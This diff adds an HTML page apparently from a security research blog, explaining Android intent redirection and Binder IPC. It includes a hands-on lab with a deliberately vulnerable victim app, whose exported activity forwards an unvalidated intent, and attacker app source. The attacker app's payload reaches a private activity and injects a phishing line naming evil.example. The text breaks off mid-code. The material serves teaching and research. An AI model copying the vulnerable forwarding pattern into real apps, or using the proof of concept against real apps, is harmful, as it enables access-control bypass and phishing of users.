@@ -1,0 +1,1553 @@
+
+
+<!DOCTYPE html>
+<html lang="ko-KR" data-default-color-scheme="&#34;auto&#34;">
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" type="image/png" href="/img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="&lt;p&gt;&lt;img src=&#34;image.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Hello! I&amp;#x2019;m &lt;code&gt;newp1ayer48&lt;/code&gt;, the one handling the lowest place (low-level) at Hackyboiz, now looking toward higher places! &amp;#x1F938;&amp;#x1F3FB;&amp;#x200D;&amp;#x2642;&amp;#xFE0F;&lt;/p&gt;
+&lt;p&gt;With the Two paths, Same Dream project I&amp;#x2019;ve been looking at Android, and within that I focus mainly on the application layer on Samsung Galaxy. There&amp;#x2019;s a sad story behind this: on Samsung Galaxy, rooting is blocked by default starting from the One UI 8.5 (Android 16) version. Because rooting would therefore require yet another 0-day&amp;#x2026; I shout &amp;#x201C;actually, even better&amp;#x201D; and focus mainly on logical bugs.&lt;/p&gt;
+&lt;p&gt;The main topic of this article is intent redirection, a vulnerability characteristic of Android and at the same time a frequently used logical bug vulnerability. Through it, without memory corruption or command injection, you can even reach a shell with high privileges such as system!&lt;/p&gt;
+&lt;h2 id=&#34;1-Intent&#34;&gt;&lt;a href=&#34;#1-Intent&#34; class=&#34;headerlink&#34; title=&#34;1. Intent&#34;&gt;&lt;/a&gt;1. Intent&lt;/h2&gt;&lt;p&gt;Intent was already introduced in the previous &lt;a href=&#34;https://hackyboiz.github.io/2026/10/12/Libera/Two_paths,Same_Dream_Part0/En/&#34;&gt;Part 0 research article&lt;/a&gt;, but since it is an important concept, let&amp;#x2019;s go over it again. In particular, let&amp;#x2019;s look at why the Intent form was used when Android was first developed and designed.&lt;/p&gt;
+&lt;p&gt;Android is an operating system designed on the philosophy that &amp;#x201C;anyone can upload an app and anyone can install it.&amp;#x201D; Therefore, developing programs in an unmanaged language that can directly access memory, like traditional C/C++, would have been a major performance/security risk. In addition, the Android application model had to be designed in a form that satisfies the following four constraints and conditions.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Speed: the system must be able to spin up a process for any part of an app when needed, and be launchable from multiple entry points.&lt;/li&gt;
+&lt;li&gt;Lifecycle: a process can die at any time, and there may be no receiver.&lt;/li&gt;
+&lt;li&gt;Name resolution: there are cases where the system cannot point to something by name, as with third-party apps, or does not know it.&lt;/li&gt;
+&lt;li&gt;Security: each app must be isolated by UID.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Therefore, a simple remote method call alone cannot satisfy these.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image%201.png&#34; alt=&#34;[https://medium.com/@esc4nor9/android-security-internals-notes-part-1-8ac593930cd2](https://medium.com/@esc4nor9/android-security-internals-notes-part-1-8ac593930cd2)&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://medium.com/@esc4nor9/android-security-internals-notes-part-1-8ac593930cd2&#34;&gt;https://medium.com/@esc4nor9/android-security-internals-notes-part-1-8ac593930cd2&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;To solve this problem, Binder IPC was adopted. This is a mechanism that already exists in the Linux Kernel. The Binder residing in the kernel delivers communication between different processes in the form of IPC messages. Through this, isolation between processes (apps) can be achieved.&lt;/p&gt;
+&lt;p&gt;A similar structure in the form of XPC can also be seen in iOS and macOS.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image%202.png&#34; alt=&#34;[https://developer.android.com/guide/platform?hl=ko](https://developer.android.com/guide/platform?hl=ko)&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://developer.android.com/guide/platform?hl=ko&#34;&gt;https://developer.android.com/guide/platform?hl=ko&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Therefore, the messages used for inter-app communication in Android must take the form of described data so that the system can read, interpret, store, and delegate them. For this reason, in addition to Binder IPC, the Java-level Intent is introduced to achieve the constraints and conditions mentioned earlier.&lt;/p&gt;
+&lt;p&gt;The Android architecture can be seen as in the picture above, and can be broadly divided into the Java Level, which runs on the Java framework, and the C Level, which runs on the Native Library/Linux Kernel. In this architecture diagram, Intent can be seen as belonging to the Java Level, and Binder IPC to the C Level.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image%203.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Mapping this to the earlier Android architecture diagram, the process of sending an Intent message from App A to App B is illustrated as above. The intent object created at App A&amp;#x2019;s Java framework layer generates a parcel message in the native library. The binder delivers it in IPC form, and in between, the system_server with System privileges (UID 1000) performs a permission check. If it passes, delivery to App B is completed, and the structure is such that the Intent is read from the parcel message and handled in App B.&lt;/p&gt;
+&lt;h2 id=&#34;2-Intent-Redirection&#34;&gt;&lt;a href=&#34;#2-Intent-Redirection&#34; class=&#34;headerlink&#34; title=&#34;2. Intent Redirection&#34;&gt;&lt;/a&gt;2. Intent Redirection&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;image%204.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;A good example for observing Intent with our own eyes is the notification. The entity that displays and triggers a notification is SystemUI (the system UI process), but when you tap a notification and it is sent, the actual Intent runs with the identity and permissions of the original app that created the notification. For example, when you tap the action button of a calendar notification or the body of a message notification, that Intent is fired not with SystemUI&amp;#x2019;s permissions but with the calendar/message app&amp;#x2019;s permissions. The basic idea of Intent Redirection starts right here.&lt;/p&gt;
+&lt;p&gt;In the normal case, App A can only launch App B&amp;#x2019;s exported components. A component with &lt;code&gt;android:exported=&amp;quot;false&amp;quot;&lt;/code&gt; can only be launched by the same app (the same UID). Intent Redirection bypasses this access control through a proxied execution that runs with that app&amp;#x2019;s permissions. For this reason, Intent Redirection is classified as a logical bug vulnerability that falls under the Confused Deputy problem.&lt;/p&gt;
+&lt;p&gt;The attacker does not call the private component directly. Instead, they send data to the victim app&amp;#x2019;s exported component, and make the victim app send, on their behalf, the Intent built from that data via &lt;code&gt;startActivity()&lt;/code&gt; and the like. As far as the system is concerned, the caller is not the attacker but the victim app.&lt;/p&gt;
+&lt;div class=&#34;table-container&#34;&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&amp;#xC9C0;&amp;#xC810;&lt;/th&gt;
+&lt;th&gt;&amp;#xBC1C;&amp;#xC0AC; API&lt;/th&gt;
+&lt;th&gt;&amp;#xACF5;&amp;#xACA9;&amp;#xC790;&amp;#xAC00; &amp;#xB178;&amp;#xB9AC;&amp;#xB294; &amp;#xAC83;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Activity&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;startActivity()&lt;/code&gt;, &lt;code&gt;startActivityForResult()&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Launch a private Activity, steal result data&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Broadcast Receiver&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;sendBroadcast()&lt;/code&gt;, &lt;code&gt;sendOrderedBroadcast()&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Deliver a crafted broadcast to a private Receiver, forge a protected action&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Content Provider&lt;/td&gt;
+&lt;td&gt;Intent data URI(&lt;code&gt;content://&lt;/code&gt;) + &lt;code&gt;FLAG_GRANT_READ/WRITE_URI_PERMISSION&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Delegate access to a private provider to the attacker&amp;#x2019;s component &amp;#x2192; steal files/DB&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;PendingIntent&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;PendingIntent.send()&lt;/code&gt; (including notifications)&lt;/td&gt;
+&lt;td&gt;Fire a stored Intent on behalf, with the original app&amp;#x2019;s permissions&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;/div&gt;
+&lt;p&gt;Intent redirection is ultimately the victim app firing an attacker-influenced Intent somewhere with its own permissions. The sinks where this firing happens are, given the Android component structure, broadly four.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Activity: a single screen the user sees and operates. For example, in a messaging app, the conversation list screen, the conversation content screen, and the message composition screen are each an Activity. Launching an app or moving to another screen is the act of starting an Activity (startActivity).&lt;/li&gt;
+&lt;li&gt;Broadcast Receiver: a component that listens and reacts to events (broadcasts) emitted by the system or other apps. For example, when events like &amp;#x201C;boot completed,&amp;#x201D; &amp;#x201C;battery low,&amp;#x201D; or &amp;#x201C;airplane mode on&amp;#x201D; arrive, the app wakes up and handles them. For instance, an alarm app re-registers alarms after boot, or a messenger starts syncing when the network connection is restored.&lt;/li&gt;
+&lt;li&gt;Content Provider: a component that provides structured data (mainly DB/files) to other apps via &lt;code&gt;content://&lt;/code&gt; URIs. A representative example is the Contacts Provider, through which a messenger reads the user&amp;#x2019;s address book with the &amp;#x201C;contacts access permission.&amp;#x201D;&lt;/li&gt;
+&lt;li&gt;PendingIntent: a PendingIntent is not an &amp;#x201C;Intent to run right now&amp;#x201D; but an Intent token entrusted so that another process can later fire it on behalf of my app. The notification explained as an example earlier is exactly this.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;2-1-Hands-on&#34;&gt;&lt;a href=&#34;#2-1-Hands-on&#34; class=&#34;headerlink&#34; title=&#34;2.1. Hands-on&#34;&gt;&lt;/a&gt;2.1. Hands-on&lt;/h3&gt;&lt;p&gt;Let&amp;#x2019;s verify Intent Redirection directly through example code and apps in a hands-on manner.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs xml&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;manifest&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;xmlns:android&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://schemas.android.com/apk/res/android&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;application&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-tag&#34;&gt;        &lt;span class=&#34;hljs-attr&#34;&gt;android:allowBackup&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;true&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-tag&#34;&gt;        &lt;span class=&#34;hljs-attr&#34;&gt;android:label&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;@string/app_name&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;
+
+        &lt;span class=&#34;hljs-comment&#34;&gt;&amp;lt;!-- Launcher: run victim normally to see the legitimate screen --&amp;gt;&lt;/span&gt;
+        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;activity&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;android:name&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;.MainActivity&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;android:exported&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;true&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;
+            &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;intent-filter&lt;/span&gt;&amp;gt;&lt;/span&gt;
+                &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;action&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;android:name&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;android.intent.action.MAIN&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;
+                &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;category&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;android:name&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;android.intent.category.LAUNCHER&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;
+            &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;intent-filter&lt;/span&gt;&amp;gt;&lt;/span&gt;
+        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;activity&lt;/span&gt;&amp;gt;&lt;/span&gt;
+
+        &lt;span class=&#34;hljs-comment&#34;&gt;&amp;lt;!-- Entry point reachable by the attacker (the redirection proxy) --&amp;gt;&lt;/span&gt;
+        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;activity&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;android:name&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;.RedirectActivity&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;android:exported&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;true&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;
+            &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;intent-filter&lt;/span&gt;&amp;gt;&lt;/span&gt;
+                &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;action&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;android:name&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;com.example.victim.REDIRECT&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;
+                &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;category&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;android:name&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;android.intent.category.DEFAULT&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;
+            &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;intent-filter&lt;/span&gt;&amp;gt;&lt;/span&gt;
+        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;activity&lt;/span&gt;&amp;gt;&lt;/span&gt;
+
+        &lt;span class=&#34;hljs-comment&#34;&gt;&amp;lt;!-- Should be reachable only by victim itself --&amp;gt;&lt;/span&gt;
+        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;activity&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;android:name&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;.SecretActivity&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;android:exported&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;false&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;
+    &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;application&lt;/span&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;manifest&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This is the &lt;code&gt;AndroidManifest.xml&lt;/code&gt; used by &lt;code&gt;victim.apk&lt;/code&gt;. &lt;code&gt;AndroidManifest.xml&lt;/code&gt; is the file that specifies the access control and permissions of the app and its components. What we should look at here is that &lt;code&gt;SecretActivity&lt;/code&gt; is set to &lt;code&gt;exported=&amp;quot;false&amp;quot;&lt;/code&gt;. With this setting, only an app that has this app&amp;#x2019;s UID can access it.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;package&lt;/span&gt; com.example.victim;
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.app.Activity;
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.content.Intent;
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.os.Bundle;
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.util.Log;
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.widget.Toast;
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; java.net.URISyntaxException;
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;RedirectActivity&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Activity&lt;/span&gt; &lt;/span&gt;{
+    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;final&lt;/span&gt; String TAG = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;victim&amp;quot;&lt;/span&gt;;
+
+    &lt;span class=&#34;hljs-meta&#34;&gt;@Override&lt;/span&gt;
+    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;onCreate&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(Bundle savedInstanceState)&lt;/span&gt; &lt;/span&gt;{
+        &lt;span class=&#34;hljs-keyword&#34;&gt;super&lt;/span&gt;.onCreate(savedInstanceState);
+
+        String uri = getIntent().getStringExtra(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;redirect_uri&amp;quot;&lt;/span&gt;);
+        Log.i(TAG, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;redirect_uri = &amp;quot;&lt;/span&gt; + uri);
+
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (uri != &lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;) {
+            &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt; {
+                Intent forward = Intent.parseUri(uri, Intent.URI_INTENT_SCHEME);
+                startActivity(forward);   &lt;span class=&#34;hljs-comment&#34;&gt;// vuln&lt;/span&gt;
+            } &lt;span class=&#34;hljs-keyword&#34;&gt;catch&lt;/span&gt; (URISyntaxException e) {
+                Log.e(TAG, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;bad redirect_uri&amp;quot;&lt;/span&gt;, e);
+                Toast.makeText(&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Invalid payload: &amp;quot;&lt;/span&gt; + e.getMessage(), Toast.LENGTH_LONG).show();
+            } &lt;span class=&#34;hljs-keyword&#34;&gt;catch&lt;/span&gt; (Exception e) {
+                Log.e(TAG, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;startActivity failed&amp;quot;&lt;/span&gt;, e);
+                Toast.makeText(&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Launch failed: &amp;quot;&lt;/span&gt; + e.getMessage(), Toast.LENGTH_LONG).show();
+            }
+        }
+        finish();
+    }
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This source code is the part where the vulnerability exists. Because there is a statement that fires the intent without validation via &lt;code&gt;startActivity(forward);&lt;/code&gt;, Intent Redirection occurs.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;package&lt;/span&gt; com.example.victim;
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.app.Activity;
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.os.Bundle;
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.widget.TextView;
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;SecretActivity&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Activity&lt;/span&gt; &lt;/span&gt;{
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;final&lt;/span&gt; String NOTICE =
+            &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[Notice] System maintenance is scheduled today at 18:00.&amp;quot;&lt;/span&gt;;
+
+    &lt;span class=&#34;hljs-meta&#34;&gt;@Override&lt;/span&gt;
+    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;onCreate&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(Bundle savedInstanceState)&lt;/span&gt; &lt;/span&gt;{
+        &lt;span class=&#34;hljs-keyword&#34;&gt;super&lt;/span&gt;.onCreate(savedInstanceState);
+
+        String extra = getIntent().getStringExtra(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;append&amp;quot;&lt;/span&gt;);
+
+        String shown = NOTICE;
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (extra != &lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;) {
+            shown = NOTICE + &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt; + extra;
+        }
+
+        TextView tv = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; TextView(&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;);
+        &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; pad = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;) (&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt; * getResources().getDisplayMetrics().density);
+        tv.setPadding(pad, pad, pad, pad);
+        tv.setTextIsSelectable(&lt;span class=&#34;hljs-keyword&#34;&gt;true&lt;/span&gt;);
+        tv.setText(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;SecretActivity (exported=false)\n\n&amp;quot;&lt;/span&gt; + shown);
+        setContentView(tv);
+    }
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This part is the restricted internal activity we saw earlier in &lt;code&gt;AndroidManifest.xml&lt;/code&gt;. As originally intended, it prints only a hardcoded string on the screen. However, it receives an intent with the app&amp;#x2019;s permissions, and because this too has no caller validation, when Intent Redirection occurs the input value is additionally printed as well.&lt;/p&gt;
+&lt;p&gt;The following is the source code of &lt;code&gt;attacker.apk&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;package&lt;/span&gt; com.example.attacker;
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.app.Activity;
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.content.Intent;
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.os.Bundle;
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.view.View;
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.widget.Button;
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.widget.EditText;
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.widget.Toast;
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;MainActivity&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Activity&lt;/span&gt; &lt;/span&gt;{
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;final&lt;/span&gt; String VICTIM_PKG = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;com.example.victim&amp;quot;&lt;/span&gt;;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;final&lt;/span&gt; String REDIRECT_ACTIVITY = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;com.example.victim.RedirectActivity&amp;quot;&lt;/span&gt;;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;final&lt;/span&gt; String SECRET_ACTIVITY = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;com.example.victim.SecretActivity&amp;quot;&lt;/span&gt;;
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;final&lt;/span&gt; String SAMPLE_PAYLOAD =
+            &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;intent:#Intent;component=com.example.victim/.SecretActivity;&amp;quot;&lt;/span&gt;
+            + &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;S.append=* Re-authenticate at http://evil.example for security;end&amp;quot;&lt;/span&gt;;
+
+    &lt;span class=&#34;hljs-meta&#34;&gt;@Override&lt;/span&gt;
+    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;onCreate&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(Bundle savedInstanceState)&lt;/span&gt; &lt;/span&gt;{
+        &lt;span class=&#34;hljs-keyword&#34;&gt;super&lt;/span&gt;.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        &lt;span class=&#34;hljs-keyword&#34;&gt;final&lt;/span&gt; EditText payload = findViewById(R.id.payload);
+        payload.setText(SAMPLE_PAYLOAD);
+
+        Button send = findViewById(R.id.btn_send);
+        send.setOnClickListener(&lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; View.OnClickListener() {
+            &lt;span class=&#34;hljs-meta&#34;&gt;@Override&lt;/span&gt;
+            &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;onClick&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(View v)&lt;/span&gt; &lt;/span&gt;{
+                String text = payload.getText().toString();
+                Intent i = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Intent(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;com.example.victim.REDIRECT&amp;quot;&lt;/span&gt;);
+                i.setClassName(VICTIM_PKG, REDIRECT_ACTIVITY);
+                i.putExtra(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;redirect_uri&amp;quot;&lt;/span&gt;, text);
+                &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt; {
+                    startActivity(i);
+                } &lt;span class=&#34;hljs-keyword&#34;&gt;catch&lt;/span&gt; (Exception e) {
